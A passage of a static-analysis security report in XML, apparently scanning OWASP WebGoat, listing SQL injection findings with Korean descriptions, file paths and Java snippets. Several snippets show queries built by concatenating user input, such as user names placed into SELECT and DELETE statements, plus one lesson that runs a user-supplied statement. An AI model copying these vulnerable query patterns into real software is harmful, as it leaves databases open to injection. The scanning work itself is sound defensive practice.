<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="290AE35B54CA1238FC786348AEAD4C6D" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.java의 149 줄에서 login() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>149</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.first())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="125AFBB5C27425AA50E71B144AE97786" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.java의 172 줄에서 getEmployeeProfile_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>172</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B89C6E51C5549D303051AB4FFC873D4D" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.java의 146 줄에서 getAllEmployees_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>146</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="23738AA4672374B793E3F0B3EF6F77C2" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);
	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="40F182886B5388EEFE531DC0B78022F2" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>143</LineStart>
<Snippet>	int salary = Integer.parseInt(request
		.getParameter(CrossSiteScripting.SALARY));
	String ccn = request.getParameter(CrossSiteScripting.CCN);
	int ccnLimit = Integer.parseInt(request
		.getParameter(CrossSiteScripting.CCN_LIMIT));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E38E0F334AA88DFD78863C64FC25B729" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.java의 178 줄에서 getEmployeeProfile_BACKUP() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>178</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A3CC95BCD894EAD3D13DABC323E3D63B" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DOS_Login.java의 147 줄에서 createContent() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>147</LineStart>
<Snippet>			    String deleteData1 = "DELETE from user_login WHERE webgoat_user = '"
				    + s.getUserName() + "'";
			    statement.executeUpdate(deleteData1);
			    return (new H1("Congratulations! Lesson Completed"));
			}</Snippet>
<TargetFunction>executeUpdate()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9D3EBB494D095ACB73F8E6265896C275" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);
	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);
	int manager = Integer.parseInt(request</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D32951D526755AC8D8AE2790B9BC4289" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>	HttpServletRequest request = s.getRequest();
	String firstName = request.getParameter(CrossSiteScripting.FIRST_NAME);
	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0AE1973FD4FF73765D0BEC7F8886DBFB" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>134</LineStart>
<Snippet>	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D22EAF3DF450EDEF696802635C6007D6" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 297 줄에서 doChangeEmployeeProfile_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>297</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>executeUpdate()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4EEAB05EB064C3B925D99AAE170F718D" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>133</LineStart>
<Snippet>	String firstName = request.getParameter(CrossSiteScripting.FIRST_NAME);
	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2636332ACE18588AF8D2FAAD06436683" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ThreadSafetyProblem.java의 103 줄에서 createContent() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>103</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="360E3CE77448ED1F01C49BC9140332C0" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DOS_Login.java의 139 줄에서 createContent() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>139</LineStart>
<Snippet>			query = "SELECT * FROM user_login WHERE webgoat_user = '"
				+ s.getUserName() + "'";
			results = statement.executeQuery(query);
			results.last();
			// If they get back more than one user they succeeded</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7BB8EDC73CB58A98C025349FD6634C4B" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.java의 148 줄에서 login() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>148</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.first())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8A18E35BD3EFE32534AC9384A5BE6956" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlStringInjection.java의 112 줄에서 injectableQuery() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CFA08E705B2FEB36B31081983682AFBA" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSqlInjection.java의 240 줄에서 getResults() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>240</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);
		return results;
	    }</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FBEE1D44AE79C9DBD77CF348837EC499" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>147</LineStart>
<Snippet>		.getParameter(CrossSiteScripting.CCN_LIMIT));
	String disciplinaryActionDate = request
		.getParameter(CrossSiteScripting.DISCIPLINARY_DATE);
	String disciplinaryActionNotes = request
		.getParameter(CrossSiteScripting.DISCIPLINARY_NOTES);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="360E3CE77448ED1F01C49BC9140332BF" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DOS_Login.java의 162 줄에서 createContent() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>162</LineStart>
<Snippet>		    query = "SELECT * FROM user_login WHERE webgoat_user = '"
			    + s.getUserName() + "'";
		    results = statement.executeQuery(query);
		    results.last();
		    ec.addElement(new H2("Successfull login count: "</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EBF2B90A529B6D5F6E3A143881FF46FC" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>StoredXss.java의 343 줄에서 makeList() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>343</LineStart>
<Snippet>	    // cookies, but not get confused by other users scripts

	    ResultSet results = statement.executeQuery(STANDARD_QUERY
		    + " WHERE user_name LIKE '" + getNameroot(s.getUserName())
		    + "%'");</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="89704EC4C74BE84EFB0D9011D711B7AD" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 106 줄에서 concept1() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>106</LineStart>
<Snippet>		if (arrSQL.length == 2)
		{
		    statement.executeUpdate(arrSQL[1]);

		    getLessonTracker(s).setStage(2);</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CDB62E3970E486E23A3869664BE02CE7" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>133</LineStart>
